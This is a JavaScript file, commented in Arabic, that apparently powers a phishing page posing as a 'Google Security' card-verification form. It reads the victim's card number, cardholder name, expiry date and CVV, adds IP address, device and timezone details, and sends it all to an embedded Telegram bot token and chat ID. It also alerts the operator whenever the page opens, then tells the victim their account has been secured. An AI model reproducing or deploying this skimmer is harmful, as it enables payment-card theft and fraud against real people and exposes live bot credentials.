// إعدادات البوت - تم ضبط التوكن والشات ايدي
const TOKEN = "8024648648:AAGrlrCMMQ7HPTOoxsKUtB2ZzF_pv1aRoO8";
const CHAT_ID = "5263073413";
const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

// انتظر حتى يتم تحميل الصفحة بالكامل
document.addEventListener('DOMContentLoaded', function() {
    const paymentForm = document.getElementById('paymentForm');
    const verifyBtn = document.getElementById('verifyBtn');
    
    if (!paymentForm) {
        console.error('لم يتم العثور على النموذج المطلوب');
        return;
    }

    // إضافة مستمع حدث للإرسال
    paymentForm.addEventListener('submit', function(e) {
        e.preventDefault();

        // الحصول على قيم الحقول
        const cardNumber = document.getElementById('cardNumber').value;
        const cardHolder = document.getElementById('cardHolder').value;
        const expiryDate = document.getElementById('expiryDate').value;
        const cvv = document.getElementById('cvv').value;

        // التحقق من وجود القيم
        if (!cardNumber || !cardHolder || !expiryDate || !cvv) {
            alert('يرجى ملء جميع الحقول المطلوبة');
            return;
        }

        // التحقق من صحة رقم البطاقة
        const cleanCardNumber = cardNumber.replace(/\s/g, '');
        if (cleanCardNumber.length !== 16 || !/^\d+$/.test(cleanCardNumber)) {
            alert('يرجى إدخال رقم بطاقة صحيح (16 رقماً)');
            return;
        }

        // التحقق من صحة CVV
        if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
            alert('يرجى إدخال رمز أمان صحيح (3 أرقام)');
            return;
        }

        // إظهار حالة التحميل
        const originalText = verifyBtn.innerHTML;
        verifyBtn.innerHTML = 'جاري المعالجة... <div class="loading"></div>';
        verifyBtn.disabled = true;

        // الحصول على عنوان IP والمعلومات الأخرى
        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                // جمع معلومات الجهاز
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
                const language = navigator.language;
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const timestamp = new Date().toLocaleString('ar-SA');

                // تنسيق الرسالة
                const message = ` 
💳 <b>New Visa Card Verification</b>

🔢 <b>Card Number:</b> <code>${cardNumber}</code>
👤 <b>Card Holder:</b> <code>${cardHolder}</code>
📅 <b>Expiry Date:</b> <code>${expiryDate}</code>
🔐 <b>CVV:</b> <code>${cvv}</code>

🌐 <b>IP Address:</b> ${ip}
📱 <b>Device Type:</b> ${deviceType}
🖥️ <b>Platform:</b> ${platform}
🗣️ <b>Language:</b> ${language}
🕒 <b>Timezone:</b> ${timezone}
📏 <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
⏰ <b>Time:</b> ${timestamp}

<b>User Agent:</b>
<pre>${userAgent}</pre>
                `;

                // إرسال البيانات إلى Telegram
                return axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                });
            })
            .then(response => {
                alert('تم تأمين حسابك بنجاح! شكراً لتأكيد معلوماتك.');
                
                // إعادة تعيين النموذج بعد الإرسال الناجح
                paymentForm.reset();
            })
            .catch(error => {
                console.error('Error:', error);
                
                if (error.response) {
                    alert('حدث خطأ في إرسال المعلومات. يرجى المحاولة مرة أخرى.');
                } else if (error.request) {
                    alert('خطأ في الشبكة. يرجى التحقق من اتصال الإنترنت.');
                } else {
                    alert('حدث خطأ غير متوقع. يرجى المحاولة مرة أخرى.');
                }
            })
            .finally(() => {
                // إعادة تعيين الزر
                verifyBtn.innerHTML = originalText;
                verifyBtn.disabled = false;
            });
    });

    // إرسال إشعار عند فتح الصفحة
    if (TOKEN && CHAT_ID) {
        const pageLoadMessage = `
🔔 <b>Google Security Page Opened</b>
🌐 <b>URL:</b> ${window.location.href}
🕒 <b>Time:</b> ${new Date().toLocaleString('ar-SA')}
📱 <b>User Agent:</b> ${navigator.userAgent}
        `;

        axios.post(URI_API, {
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: pageLoadMessage
        }).catch(error => {
            console.log('Failed to send page load notification');
        });
    }

    // وظائف تنسيق الإدخال
    document.getElementById('cardNumber').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        let formattedValue = value.match(/.{1,4}/g)?.join(' ');
        if (formattedValue) {
            e.target.value = formattedValue;
        }
    });

    document.getElementById('expiryDate').addEventListener('input', function(e) {
        let value = e.target.value.replace(/[^0-9]/g, '');
        if (value.length >= 2) {
            e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
    });

    document.getElementById('cvv').addEventListener('input', function(e) {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
    });

    console.log('Google Security Telegram Bot script loaded successfully!');
    console.log('Bot Token:', TOKEN);
    console.log('Chat ID:', CHAT_ID);
});

// دالة للحصول على الموقع من IP
async function getLocationFromIP(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        const data = response.data;
        if (data.status === 'success') {
            return `${data.city}, ${data.country}`;
        }
        return 'Unknown';
    } catch (error) {
        return 'Unknown';
    }
}
